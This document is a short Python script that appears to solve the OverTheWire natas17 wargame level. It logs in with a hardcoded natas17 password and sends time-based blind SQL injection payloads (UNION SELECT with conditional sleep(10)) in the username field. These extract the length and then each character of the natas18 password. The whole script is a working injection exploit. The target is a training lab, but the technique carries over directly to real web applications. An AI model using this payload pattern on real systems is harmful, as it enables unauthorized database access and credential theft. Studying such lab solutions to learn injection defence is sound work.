from requests.auth import HTTPBasicAuth
import requests
import string
auth = HTTPBasicAuth('natas17', '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw')
a = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'
url ='http://natas17.natas.labs.overthewire.org'
key = ''
length=int(input("Enter length of password to check : "))+ int(1)
for i in range(1,length,1):
    data = {'username' : '" union select \'a\',IF(length(password) = '+str(i)+', sleep(10), null) from users where username=\'natas18\'#'}
    r = requests.post(url, auth=auth, data=data)
    print("checking password length PLease wait : " + str(r.elapsed.total_seconds())[0:2])
    if str(r.elapsed.total_seconds())[0:2] == '10':
        print("Password length = " + str(i))
        passlength = int(i) + int(1)
        print("start bruteforcing wait")
        for i in range(1,passlength,1):
            for j in a:
                data = {'username' : '" union select password,IF(substring(password,'+str(i)+',1) like binary \''+str(j)+'\' , sleep(10), null) from users where username=\'natas18\'#'}
                r = requests.post(url, auth=auth, data=data)
                if str(r.elapsed.total_seconds())[0:2] == '10':
                    key += str(j)
                    print("newletterfound = " + key)
                    if len(key) == int(passlength) - int(1):
                        print("here is your key : " + key)
                        break
